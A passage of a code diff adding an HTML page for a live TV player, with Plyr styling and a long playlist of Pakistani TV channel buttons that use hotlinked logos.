+            transform: translateY(-50%)
+        }
+
+        .plyr--fullscreen-fallback .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr--fullscreen-fallback .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr--fullscreen-fallback.plyr--hide-controls {
+            cursor: none
+        }
+
+        @media(min-width:1024px) {
+            .plyr--fullscreen-fallback .plyr__captions {
+                font-size: 21px
+            }
+        }
+
+        .plyr__ads {
+            border-radius: inherit;
+            bottom: 0;
+            cursor: pointer;
+            left: 0;
+            overflow: hidden;
+            position: absolute;
+            right: 0;
+            top: 0;
+            z-index: -1
+        }
+
+        .plyr__ads>div,
+        .plyr__ads>div iframe {
+            height: 100%;
+            position: absolute;
+            width: 100%
+        }
+
+        .plyr__ads::after {
+            background: rgba(255, 0, 0, .8);
+            border-radius: 2px;
+            bottom: 10px;
+            color: #fff;
+            content: attr(data-badge-text);
+            font-size: 11px;
+            padding: 2px 6px;
+            pointer-events: none;
+            position: absolute;
+            right: 10px;
+            z-index: 3
+        }
+
+        .plyr__ads::after:empty {
+            display: none
+        }
+
+        .plyr__cues {
+            background: currentColor;
+            display: block;
+            height: 5px;
+            left: 0;
+            margin: -2.5px 0 0;
+            opacity: .8;
+            position: absolute;
+            top: 50%;
+            width: 3px;
+            z-index: 3
+        }
+
+        .plyr__preview-thumb {
+            background-color: rgba(255, 0, 0, .9);
+            border-radius: 3px;
+            bottom: 100%;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, .15);
+            margin-bottom: 10px;
+            opacity: 0;
+            padding: 3px;
+            pointer-events: none;
+            position: absolute;
+            transform: translate(0, 10px) scale(.8);
+            transform-origin: 50% 100%;
+            transition: transform .2s .1s ease, opacity .2s .1s ease;
+            z-index: 2
+        }
+
+        .plyr__preview-thumb--is-shown {
+            opacity: 1;
+            transform: translate(0, 0) scale(1)
+        }
+
+        .plyr__preview-thumb::before {
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 4px solid rgba(255, 0, 0, .9);
+            bottom: -4px;
+            content: '';
+            height: 0;
+            left: 50%;
+            position: absolute;
+            transform: translateX(-50%);
+            width: 0;
+            z-index: 2
+        }
+
+        .plyr__preview-thumb__image-container {
+            background: #c1c9d1;
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+            z-index: 0
+        }
+
+        .plyr__preview-thumb__image-container img {
+            height: 100%;
+            left: 0;
+            max-height: none;
+            max-width: none;
+            position: absolute;
+            top: 0;
+            width: 100%
+        }
+
+        .plyr__preview-thumb__time-container {
+            bottom: 6px;
+            left: 0;
+            position: absolute;
+            right: 0;
+            white-space: nowrap;
+            z-index: 3
+        }
+
+        .plyr__preview-thumb__time-container span {
+            background-color: rgba(0, 0, 0, .55);
+            border-radius: 2px;
+            color: #fff;
+            font-size: 14px;
+            padding: 3px 6px
+        }
+
+        .plyr__preview-scrubbing {
+            bottom: 0;
+            filter: blur(1px);
+            height: 100%;
+            left: 0;
+            margin: auto;
+            opacity: 0;
+            overflow: hidden;
+            position: absolute;
+            right: 0;
+            top: 0;
+            transition: opacity .3s ease;
+            width: 100%;
+            z-index: 1
+        }
+
+        .plyr__preview-scrubbing--is-shown {
+            opacity: 1
+        }
+
+        .plyr__preview-scrubbing img {
+            height: 100%;
+            left: 0;
+            max-height: none;
+            max-width: none;
+            object-fit: contain;
+            position: absolute;
+            top: 0;
+            width: 100%
+        }
+
+        .plyr--no-transition {
+            transition: none !important
+        }
+
+        .plyr__sr-only {
+            clip: rect(1px, 1px, 1px, 1px);
+            overflow: hidden;
+            border: 0 !important;
+            height: 1px !important;
+            padding: 0 !important;
+            position: absolute !important;
+            width: 1px !important
+        }
+
+        .plyr [hidden] {
+            display: none !important
+        }
+
+        .player-dialog {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #f5f5f5;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            text-align: center;
+            z-index: 9999;
+        }
+
+        .player-option {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            margin: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .player-option:hover {
+            background-color: #0056b3;
+        }
+
+        html {
+            font-family: Poppins;
+            background: #000;
+            margin: 0;
+            padding: 0
+        }
+
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+        }
+
+        .loading-text {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            text-align: center;
+            width: 100%;
+            height: 100px;
+            line-height: 100px;
+        }
+
+        .loading-text span {
+            display: inline-block;
+            margin: 0 5px;
+            color: #FF0000;
+            font-family: 'Quattrocento Sans', sans-serif;
+        }
+
+        .loading-text span:nth-child(1) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 0s infinite linear alternate;
+        }
+
+        .loading-text span:nth-child(2) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 0.2s infinite linear alternate;
+        }
+
+        .loading-text span:nth-child(3) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 0.4s infinite linear alternate;
+        }
+
+        .loading-text span:nth-child(4) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 0.6s infinite linear alternate;
+        }
+
+        .loading-text span:nth-child(5) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 0.8s infinite linear alternate;
+        }
+
+        .loading-text span:nth-child(6) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 1s infinite linear alternate;
+        }
+
+        .loading-text span:nth-child(7) {
+            filter: blur(0px);
+            animation: blur-text 1.5s 1.2s infinite linear alternate;
+        }
+
+        @keyframes blur-text {
+            0% {
+                filter: blur(0px);
+            }
+
+            100% {
+                filter: blur(4px);
+            }
+        }
+
+        .plyr__video-wrapper::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            height: 100px;
+            width: 115px;
+            background: url('') no-repeat;
+            background-size: 75px auto, auto;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            height: 200px;
+        }
+
+        button {
+            background: transparent;
+            border: none;
+            padding: 5px;
+            margin: 5px;
+        }
+
+        .print {
+            border-radius: 50px;
+            height: 65px;
+            width: 65px;
+            border: 2px solid white;
+            Padding: 2px;
+        }
+
+        #playlist {
+            align-content: center;
+        }
+
+        .video-container {
+            position: relative;
+        }
+
+        .playlist-container {
+            max-height: 60vh;
+            overflow-y: auto;
+        }
+
+        .video-player {
+            position: sticky;
+            top: 0;
+            background-color: #f2f2f2;
+        }
+
+        .playlist {
+            background-color: #000;
+        }
+
+        @keyframes button1 {
+            0% {
+                transform: translateY(0px);
+                filter: hue-rotate(180deg);
+            }
+
+            50% {
+                transform: translateY(-350px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        @keyframes button2 {
+            0% {
+                transform: translateY(0px);
+                filter: hue-rotate(180deg);
+            }
+
+            50% {
+                transform: translateY(-350px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        @keyframes button3 {
+            0% {
+                transform: translateY(0px);
+                filter: hue-rotate(180deg);
+            }
+
+            50% {
+                transform: translateY(-350px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        @keyframes button4 {
+            0% {
+                transform: translateY(0px);
+                filter: hue-rotate(180deg);
+            }
+
+            50% {
+                transform: translateY(-350px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+                   .blink {
+                animation-name: blinker;
+                animation-duration: 1s;
+                animation-timing-function: linear;
+                animation-iteration-count: infinite;
+            }
+            @keyframes blinker {
+                0% {
+                	transition: 1s;
+                    opacity: 1;
+                }
+                50% {
+                	transition: 1.5s;
+                    opacity: 0;
+                }
+                100% {
+                	transition: 1.7s;
+                    opacity: 1;
+                }
+            }
+
+          
+
+	
+	
+.print{height:60px;
+width:60px;
+border-radius:5px;
+border:1.5px solid #999;
+
+ border-radius:50%;
+ 
+ 
+ 
+}
+
+.container{
+    height: 100vh;
+    width: 100vw;
+    background-color: #dde1e7;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+}
+
+.bar{
+    height: 100px;
+    width: 10px;
+    background-color: #dde1e7;
+    border-radius: 50px;
+    position: relative;
+    box-shadow: 15px 15px 20px rgba(0, 0, 0, .1), -15px -15px 20px #ffffff, inset -5px -5px 5px rgba(255, 255, 255, .5), inset -5px -5px 5px rgba(0, 0, 0, 0.05);
+    display: flex;
+    overflow: hidden;
+    z-index: 10;
+}
+
+#button1, #button2, #button3, #button4{
+    background-color: #dde1e7;
+    display: block;
+    height: 10px;
+    width: 100%;
+    border-radius: 40px;
+    position: absolute;
+    bottom: 0px;
+    z-index: -1;
+    box-shadow: inset -5px -5px 5px rgba(0, 0, 0, .2), inset 5px 5px 5px #fff, 0 420px 0 400px #008DFF;
+    border: 0px solid #dde1e7;
+}
+
+#button1{
+    animation: button1 2.5s ease-in-out infinite;
+}
+
+#button2{
+    animation: button2 2.5s ease-in-out .5s infinite;
+}
+
+#button3 {
+    animation: button3 2.5s ease-in-out .75s infinite;
+}
+
+#button4 {
+    animation: button4 2.5s ease-in-out 1s infinite;
+}
+
+@keyframes button1{
+    0%{
+        transform: translateY(0px);
+        filter: hue-rotate(180deg);
+    }
+    
+    50%{
+        transform: translateY(-350px);
+    }
+    
+    100%{
+        transform: translateY(0px);
+    }
+}
+
+@keyframes button2{
+    0%{
+        transform: translateY(0px);
+        filter: hue-rotate(180deg);
+    }
+    
+    50%{
+        transform: translateY(-350px);
+    }
+    
+    100%{
+        transform: translateY(0px);
+    }
+}
+
+@keyframes button3 {
+    0% {
+        transform: translateY(0px);
+        filter: hue-rotate(180deg);
+    }
+
+    50% {
+        transform: translateY(-350px);
+    }
+
+    100% {
+        transform: translateY(0px);
+    }
+}
+
+@keyframes button4 {
+    0% {
+        transform: translateY(0px);
+        filter: hue-rotate(180deg);
+    }
+
+    50% {
+        transform: translateY(-350px);
+    }
+
+    100% {
+        transform: translateY(0px);
+    }
+}
+
+
+    </style>
+
+</head>
+
+<body>
+
+
+    <section id="video-player">
+    	
+    
+
+        <video id="js-player" controls crossorigin playsinline
+            poster="https://i.postimg.cc/NFrnHhxd/20240503-235754.jpg" class="js-player">
+        </video>
+    </section>
+    <div id="playlist">
+        <center>
+            <section class="playlist-container">
+                <section class="playlist">
+                <html>
+<head>
+</head>
+<title>wcc</title>
+<body text="white">
+<center>
+<marquee width="300" scrollamount="300" scrollhiding="500" loop="1000">
+</marquee> </center>
+</body> </html>
+<h1>SHAKEEL AHMAD</h1>
+                    <marquee id="note" style="display: inline-block;" scrollamount="5" behavior="scroll" direction="right"><h4>
+&#1575;&#1587; &#1587;&#1740;&#1705;&#1588;&#1606; &#1605;&#1740;&#1722; &#1605;&#1608;&#1580;&#1608;&#1583; &#1578;&#1605;&#1575;&#1605; &#1608;&#1740;&#1672;&#1740;&#1608;&#1586; &#1570;&#1662; &#1580;&#1575;&#1586; &#1705;&#1740; &#1587;&#1605; &#1587;&#1746; &#1601;&#1585;&#1740; &#1583;&#1740;&#1705;&#1726; &#1587;&#1705;&#1578;&#1746; &#1729;&#1740;&#1722;&#1748; &#1575;&#1587; &#1662;&#1740;&#1580; &#1705;&#1608; &#1705;&#1726;&#1608;&#1604;&#1606;&#1746; &#1705;&#1746; &#1604;&#1740;&#1746; &#1570;&#1662; &#1705;&#1746; &#1662;&#1575;&#1587; 8 &#1587;&#1746; 10 &#1575;&#1740;&#1605; &#1576;&#1740; &#1729;&#1608;&#1606;&#1746; &#1670;&#1575;&#1729;&#1740;&#1746;&#1548; &#1604;&#1740;&#1705;&#1606; &#1570;&#1662; &#1705;&#1746; &#1575;&#1740;&#1605; &#1576;&#1740; &#1575;&#1587;&#1578;&#1593;&#1605;&#1575;&#1604; &#1606;&#1729;&#1740;&#1722; &#1729;&#1608;&#1606;&#1711;&#1746;&#1748; &#1608;&#1740;&#1672;&#1740;&#1608; &#1606;&#1729; &#1670;&#1604;&#1606;&#1746; &#1740;&#1575; &#1586;&#1740;&#1575;&#1583;&#1729; &#1583;&#1740;&#1585; &#1604;&#1608;&#1672;&#1606;&#1711; &#1705;&#1740; &#1589;&#1608;&#1585;&#1578; &#1605;&#1740;&#1722; &#1608;&#1740;&#1672;&#1740;&#1608; &#1662;&#1585; &#1583;&#1608;&#1576;&#1575;&#1585;&#1729; &#1705;&#1604;&#1705; &#1705;&#1585;&#1740;&#1722;&#1748; &#1605;&#1580;&#1726;&#1746; &#1575;&#1662;&#1606;&#1740; &#1583;&#1593;&#1575;&#1572;&#1722; &#1605;&#1740;&#1722; &#1740;&#1575;&#1583; &#1585;&#1705;&#1726;&#1606;&#1575; &#1748; &#1588;&#1705;&#1585;&#1740;&#1729;
+</marquee>
+
+	
+                    <div>
+                    
+
+<button class="playlist-button" data-slug="PAKVSWI-T20-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1712061800-logo-new.webp?id=33"></button>
+                        <!---PAK VS WI -->
+                        	
+                        
+                        <button class="playlist-button" data-slug="Tensports-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/logo/ten-sports-hd-logo.webp?id=13"></button>
+                        <!---TEN SPORTS -->
+
+
+                        <button class="playlist-button" data-slug="Eurosport-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1686912440-logo.webp?id=24"></button>
+                        <!---EURO -->
+                        	
+                        
+                        <button class="playlist-button" data-slug="Green_Entertainment-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1702552123-logo.webp?id=25"></button>
+                        <!---GREEN ENTERTAINMENT-->
+                        	
+                        
+                        <button class="playlist-button" data-slug="AAN-TV-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1681977574-logo.webp?id=59"></button>
+                        <!---AAN ENTERTAINMENT-->
+                        	
+                        
+                        <button class="playlist-button" data-slug="SabTV-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1686044497-logo.webp?id=65"></button>
+                        <!---SAB ENTERTAINMENT-->
+                        	
+                        
+                        
+                        <button class="playlist-button" data-slug="Suno_News-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1709545345-logo.webp?id=48"></button>
+                        <!---SUNO NEWS-->
+                        	
+                        
+                        <button class="playlist-button" data-slug="ARYnews-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1684242189-logo.webp?id=94"></button>
+                        <!---d071Grrx -->
+          
+                        
+                        <button class="playlist-button" data-slug="Minimax-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1702633459-logo.webp?id=22"></button>
+                        <!---MINIMAX-->
+                        
+                        
+                        <button class="playlist-button" data-slug="PNN-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/AIKNEWS-LOGO.webp?id=80"></button>
+                        <!---AIK NEWS-->
+                        	
+                        
+                        <button class="playlist-button" data-slug="148"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/1706163791-logo.webp?id=49"></button>
+                        <!---AL JAZEERA-->
+                        	
+                        
+                        <button class="playlist-button" data-slug="DiscoveryPakistan-abr"><img class="print"
+                                src="https://canvas.tamashaweb.com/jazzlive/uploads/channels/logo/discover-pakistan-live-logo.webp?id=94"></button>
+                        <!---DISCOVER PAKISTAN-->
+
+
+                        <button class="playlist-button" data-slug="121"><img class="print"
+                                src="https://i.postimg.cc/TpVbxb00/Bharwana-Tv-channels-logo-id-121-madani-channel-live-png.webp"></button>
+                        <!---MADANI CHANNEL -->
+
+
+
+
+                        <button class="playlist-button" data-slug="141"><img class="print"
+                                src="https://i.postimg.cc/ftQ31Tdp/Bharwana-Tv-channels-logo-id-141-saudi-sunnah-madinah-tv-hd-live-png.webp"></button>
+
+                        <!---MADINAH TV-->
+
+
+                        <button class="playlist-button" data-slug="142"><img class="print"
+                                src="https://i.postimg.cc/2LwCcCdQ/Bharwana-Tv-channels-logo-id-142-saudi-quran-makkah-tv-hd-live-png.webp"></button>
+                        <!---MAKKAH TV -->
+
+
+
+                        <button class="playlist-button" data-slug="137"><img class="print"
+                                src="https://i.postimg.cc/tZv5hxwW/Bharwana-Tv-channels-logo-id-137-geo-news-live-png.webp"></button>
+                        <!---GEO NEWS -->
+
+
+                        <button class="playlist-button" data-slug="87"><img class="print"
+                                src="https://i.postimg.cc/rzTYc1CZ/Bharwana-Tv-channels-logo-id-87-cartoon-network-live-png.webp"></button>
+                        <!---CARTOON NETWORK -->
+
+
+                        <button class="playlist-button" data-slug="77"><img class="print"
+                                src="https://i.postimg.cc/w1wwQZSS/Bharwana-Tv-channels-logo-id-77-baby-tv-live-png.webp"></button>
+                        <!---BABY TV -->
+
+
+                        <button class="playlist-button" data-slug="84"><img class="print"
+                                src="https://i.postimg.cc/t1RLXhjH/Bharwana-Tv-channels-logo-id-84-ary-digital-live-png.webp"></button>
+                        <!---mr7Rywph -->
+
+
+                        <button class="playlist-button" data-slug="85"><img class="print"
+                                src="https://i.postimg.cc/1gzjxsGm/Bharwana-Tv-channels-logo-id-85-ary-zindagi-live-logo-png.webp"></button>
+                        <!---nLKbDLMD -->
+
+
+
+                        <button class="playlist-button" data-slug="80"><img class="print"
+                                src="https://i.postimg.cc/YjVR0Q1w/Bharwana-Tv-channels-logo-id-80-HUM-News-Channel-logo-png.webp"></button>
+                        <!---HUM NEWS-->
+
+
+                        <button class="playlist-button" data-slug="81"><img class="print"
+                                src="https://i.postimg.cc/xXVPyYxx/Bharwana-Tv-channels-logo-id-157-4-HUM-Sitaray-Channel-logo-png.webp"></button>
+                        <!---HUM SITARAY-->
+
+
+
+
+
+                        <button class="playlist-button" data-slug="122"><img class="print"
+                                src="https://i.postimg.cc/GHWX7v2j/Bharwana-Tv-channels-logo-id-122-geo-entertainment-live-png.webp"></button>
+                        <!---GEO ENTERTAINMENT-->
+
+
+                        <button class="playlist-button" data-slug="177"><img class="print"
+                                src="https://i.postimg.cc/jnWTRyyj/Bharwana-Tv-channels-logo-id-117-aruj-live-png.webp"></button>
+                        <!---ARUJ TV -->
+
+
+                        <button class="playlist-button" data-slug="118"><img class="print"
+                                src="https://i.postimg.cc/9rV4JSpF/Bharwana-Tv-channels-logo-id-118-a-plus-live-png.webp"></button>
+                        <!---A PLUS -->
+
+
+                        <button class="playlist-button" data-slug="154"><img class="print"
+                                src="https://i.postimg.cc/CzgZc10q/Bharwana-Tv-channels-logo-id-154-play-tv-live-png.webp"></button>
+                        <!---PLAY TV -->
+
+
+                        <button class="playlist-button" data-slug="129"><img class="print"
+                                src="https://i.postimg.cc/PLYJbs74/Bharwana-Tv-channels-logo-id-129-tv-one-live-png.webp"></button>
+                        <!---TV ONE -->
+
+
+                        <button class="playlist-button" data-slug="125"><img class="print"
+                                src="https://i.postimg.cc/mPnQD4x2/Bharwana-Tv-channels-logo-id-125-aaj-entertainment-live-png.webp"></button>
+                        <!---AJJ ENTERTAINMENT-->
+
+
+
+                        <button class="playlist-button" data-slug="131"><img class="print"
+                                src="https://i.postimg.cc/1fcFSPtq/Bharwana-Tv-channels-logo-id-131-8xm-live-png.webp"></button>
+                        <!---8XM TV -->
+
+
+                        <button class="playlist-button" data-slug="132"><img class="print"
+                                src="https://i.postimg.cc/Vd8wx0dz/Bharwana-Tv-channels-logo-id-132-discover-pakistan-live-logo-png.webp"></button>
+                        <!---DISCOVER PAKISTAN-->
+
+
+                        <button class="playlist-button" data-slug="133"><img class="print"
+                                src="https://i.postimg.cc/3dcyjZtt/Bharwana-Tv-channels-logo-id-133-abb-takk-news-live-png.webp"></button>
+                        <!---ABB TAKK NEWS -->
+
+
+                        <button class="playlist-button" data-slug="134"><img class="print"
+                                src="https://i.postimg.cc/grBc123J/Bharwana-Tv-channels-logo-id-134-apna-tv-live-png.webp"></button>
+                        <!---APNA TV-->
+
+
+                        <button class="playlist-button" data-slug="135"><img class="print"
+                                src="https://i.postimg.cc/VdnqNpfj/Bharwana-Tv-channels-logo-id-135-jalwa-tv-live-png.webp"></button>
+                        <!---JALWA TV-->
+
+
+                        <button class="playlist-button" data-slug="136-1"><img class="print"
+                                src="https://i.postimg.cc/0rxMfjPJ/Bharwana-Tv-channels-logo-id-136-1-sindh-tv-live-png.webp"></button>
+                        <!---SINDH TV -->
+
+
+                        <button class="playlist-button" data-slug="124"><img class="print"
+                                src="https://i.postimg.cc/SnnMHPX0/Bharwana-Tv-channels-logo-id-124-aaj-news-live-png.webp"></button>
+                        <!---AJJ NEWS -->
+
+
+                        <button class="playlist-button" data-slug="136-2"><img class="print"
+                                src="https://i.postimg.cc/4n5KFGx2/Bharwana-Tv-channels-logo-id-136-2-sindh-tv-news-live-png.webp"></button>
+                        <!---SINDH NEWS -->
+
+
+                        <button class="playlist-button" data-slug="136-4"><img class="print"
+                                src="https://i.postimg.cc/dZRbsnLw/Bharwana-Tv-channels-logo-id-136-4-DW-english-live-png.webp"></button>
+                        <!---DW ENGLISH TV-->
+
+
+
+                        <button class="playlist-button" data-slug="139"><img class="print"
+                                src="https://i.postimg.cc/5Xt2rQR6/Bharwana-Tv-channels-logo-id-139-roze-news-live-png.webp"></button>
+                        <!---ROZE NEWS-->
+
+
+                        <button class="playlist-button" data-slug="140"><img class="print"
+                                src="https://i.postimg.cc/G9M9rQnb/Bharwana-Tv-channels-logo-id-140-afghan-tv-live-png.webp"></button>
+                        <!---AFGHAN TV -->
+
+
+                        <button class="playlist-button" data-slug="126"><img class="print"
+                                src="https://i.postimg.cc/MvNFChsV/Bharwana-Tv-channels-logo-id-126-filmworld-live-png.webp"></button>
+                        <!---FILM WORLD -->
+
+
+                        <button class="playlist-button" data-slug="127"><img class="print"
+                                src="https://i.postimg.cc/t1Pp0RR0/Bharwana-Tv-channels-logo-id-127-kay2-tv-live-png.webp"></button>
+                        <!---KAY2 TV-->
+
+
+                        <button class="playlist-button" data-slug="128"><img class="print"
+                                src="https://i.postimg.cc/mhMz39v4/Bharwana-Tv-channels-logo-id-128-news-one-live-png.webp"></button>
+                        <!---NEWS ONE  -->
+
+
+
+                        <button class="playlist-button" data-slug="130"><img class="print"
+                                src="https://i.postimg.cc/LqK68QsZ/Bharwana-Tv-channels-logo-id-130-waseb-live-png.webp"></button>
+                        <!---WASEB TV-->
+
+
+                        <button class="playlist-button" data-slug="143"><img class="print"
+                                src="https://i.postimg.cc/mzkkFz7v/Bharwana-Tv-channels-logo-id-143-city41-live-png.webp"></button>
+                        <!---CITY 41 -->
+
+
+
+                        <button class="playlist-button" data-slug="109"><img class="print"
+                                src="https://i.postimg.cc/xX9z1dF2/Bharwana-Tv-channels-logo-id-109-mashriq-tv-live-png.webp"></button>
+
+                        <!---Mashriq TV -->
+
+
+                        <button class="playlist-button" data-slug="110"><img class="print"
+                                src="https://i.postimg.cc/K3XKScgC/Bharwana-Tv-channels-logo-id-110-neo-tv-live-png.webp"></button>
+                        <!---NEO TV-->
+
+
+                        <button class="playlist-button" data-slug="115"><img class="print"
+                                src="https://i.postimg.cc/Ny5LK26W/Bharwana-Tv-channels-logo-id-115-public-news-live-png.webp"></button>
+                        <!---PUBLIC TV -->
+
+
+                        <button class="playlist-button" data-slug="116"><img class="print"
+                                src="https://i.postimg.cc/bZR1xn2r/Bharwana-Tv-channels-logo-id-116-k21-news-live-png.webp"></button>
+                        <!---K21 NEWS-->
+
+
+
+                        <button class="playlist-button" data-slug="119"><img class="print"
+                                src="https://i.postimg.cc/nCDkDMk9/Bharwana-Tv-channels-logo-id-119-HUM-Pashto-Channel-logo-png.webp"></button>
+                        <!---HUM PASHTU-->
+
+
+                        <button class="playlist-button" data-slug="144"><img class="print"
+                                src="https://i.postimg.cc/dkN7WmqQ/Bharwana-Tv-channels-logo-id-144-city-42-live-png.webp"></button>
+                        <!---CITY 42 -->
+
+
+                        <button class="playlist-button" data-slug="146"><img class="print"
+                                src="https://i.postimg.cc/H8LwnkLn/Bharwana-Tv-channels-logo-id-146-channel-24-live-png.webp"></button>
+                        <!---24 NEWS -->
+
+
+                        <button class="playlist-button" data-slug="147"><img class="print"
+                                src="https://i.postimg.cc/SjWRYh9N/Bharwana-Tv-channels-logo-id-147-rohi-live-png.webp"></button>
+                        <!---ROHI TV -->
+
+
+                        <button class="playlist-button" data-slug="149"><img class="print"
+                                src="https://i.postimg.cc/5YXvWkKQ/Bharwana-Tv-channels-logo-id-149-ktn-entertainment-live-png.webp"></button>
+                        <!---KTN ENTERTAINMENT-->
+
+
+                        <button class="playlist-button" data-slug="150"><img class="print"
+                                src="https://i.postimg.cc/TyYgCPr9/Bharwana-Tv-channels-logo-id-150-kashish-live-png.webp"></button>
+                        <!---KASHISH TV-->
+
+
+                        <button class="playlist-button" data-slug="151"><img class="print"
+                                src="https://i.postimg.cc/zb4hzS4t/Bharwana-Tv-channels-logo-id-151-ktn-news-live-png.webp"></button>
+                        <!---KTN NEWS-->
+
+
+                        <button class="playlist-button" data-slug="152"><img class="print"
+                                src="https://i.postimg.cc/hXMKb44c/Bharwana-Tv-channels-logo-id-152-dawn-news-live-png.webp"></button>
+                        <!---DAWAN NEWS-->
+
+
+
+                        <button class="playlist-button" data-slug="155"><img class="print"
+                                src="https://i.postimg.cc/cKn0qRM4/Bharwana-Tv-channels-logo-id-155-express-news-live-png.webp"></button>
+                        <!---EXPRESS NEWS -->
+
+
+                        <button class="playlist-button" data-slug="156"><img class="print"
+                                src="https://i.postimg.cc/m1bP2X8S/Bharwana-Tv-channels-logo-id-156-see-tv-live-png.webp"></button>
+                        <!----->
+
+
+
+                        <button class="playlist-button" data-slug="157-2"><img class="print"
+                                src="https://i.postimg.cc/nsR75t2t/Bharwana-Tv-channels-logo-id-157-2-kohenoor-tv-live-png.webp"></button>
+                        <!---ZRZcWby0 -->
+
+
+
+
+                        <button class="playlist-button" data-slug="158-1"><img class="print"
+                                src="https://i.postimg.cc/fkB4rqnf/Bharwana-Tv-channels-logo-id-158-1-filmax-live-png.webp"></button>
+                        <!---4NTJnjWq -->
+
+
+                        <button class="playlist-button" data-slug="158-2"><img class="print"
+                                src="https://i.postimg.cc/zVZh47C3/Bharwana-Tv-channels-logo-id-158-2-ltn-family-live-png.webp"></button>
+                        <!---7YbNGQb1 -->
+
+
+                        <button class="playlist-button" data-slug="158-4"><img class="print"
+                                src="https://i.postimg.cc/QFWdsZj3/Bharwana-Tv-channels-logo-id-158-4-urdu-1-live-png.webp"></button>
+                        <!---13vnGyTf -->
+
+
+                        <button class="playlist-button" data-slug="159-1"><img class="print"
+                                src="https://i.postimg.cc/2qPMngWC/Bharwana-Tv-channels-logo-id-159-1-express-entertainment-live-png.webp"></button>
+                        <!---cHHWGS4t -->
+
+
+                        <button class="playlist-button" data-slug="159-2"><img class="print"
+                                src="https://i.postimg.cc/tsDVZHLV/Bharwana-Tv-channels-logo-id-159-2-mehran-tv-logo-png.webp"></button>
+                        <!---pdMQSWCk -->
+
+
+                        <button class="playlist-button" data-slug="159-3"><img class="print"
+                                src="https://i.postimg.cc/XpVhKfrB/Bharwana-Tv-channels-logo-id-159-3-bol-news-live-png.webp"></button>
+                        <!---BOL NEWS-->
+
+
+                        <button class="playlist-button" data-slug="159-4"><img class="print"
+                                src="https://i.postimg.cc/BjngbNXN/Bharwana-Tv-channels-logo-id-159-4-bol-entertainment-live-png.webp"></button>
+                        <!--BOL ENT-->
+
+
+                        <button class="playlist-button" data-slug="159-4"><img class="print"
+                                src="https://i.postimg.cc/ygLRMCTH/Bharwana-Tv-channels-logo-id-159-4-channel-five-live-png.webp"></button>
+                        <!---CHANNEL 5-->
+
+
+                        <button class="playlist-button" data-slug="160"><img class="print"
+                                src="https://i.postimg.cc/CBSyWj6D/Bharwana-Tv-channels-logo-id-160-khyber-news-live-png.webp"></button>
+                        <!---KHAYBER NEWS-->
+
+
+
+                        <button class="playlist-button" data-slug="172"><img class="print"
+                                src="https://i.postimg.cc/qNtzRCXW/Bharwana-Tv-channels-logo-id-172-time-news-live-png.webp"></button>
+                        <!---TIME NEWS-->
+
+
+                        <button class="playlist-button" data-slug="173"><img class="print"
+                                src="https://i.postimg.cc/jDkSYqpv/Bharwana-Tv-channels-logo-id-173-samaa-tv-live-png.webp"></button>
+                        <!---SAMAA NEWS-->
+
+                        <button class="playlist-button" data-slug="174"><img class="print"
+                                src=" https://i.postimg.cc/yY7fc93h/20231116-122445.jpg"></button>
+                        <!---PTV HOME-->
+
+
+                        <button class="playlist-button" data-slug="175"><img class="print"
+                                src="https://i.postimg.cc/wtGy2Qxq/Bharwana-Tv-channels-logo-id-175-metro-1-news-live-png.webp"></button>
+                        <!---METRO 1-->
+
+
+
+
+                        <button class="playlist-button" data-slug="176"><img class="print"
+                                src="https://i.postimg.cc/2bLqKL34/Bharwana-Tv-channels-logo-id-176-movie-one-live-png.webp"></button>
+                        <!---MOVIES ONE-->
+
+
+                        <button class="playlist-button" data-slug="177"><img class="print"
+                                src="https://i.postimg.cc/bSYTnRmz/Bharwana-Tv-channels-logo-id-177-champion-tv-live-png.webp"></button>
+                        <!---90ZNv8Tq -->
+
+
+                        <button class="playlist-button" data-slug="179"><img class="print"
+                                src="https://i.postimg.cc/qgCnmSC9/Bharwana-Tv-channels-logo-id-179-lahore-rang-logo-png.webp"></button>
+                        <!---kMTc5dMX -->
+
+
+                        <button class="playlist-button" data-slug="181"><img class="print"
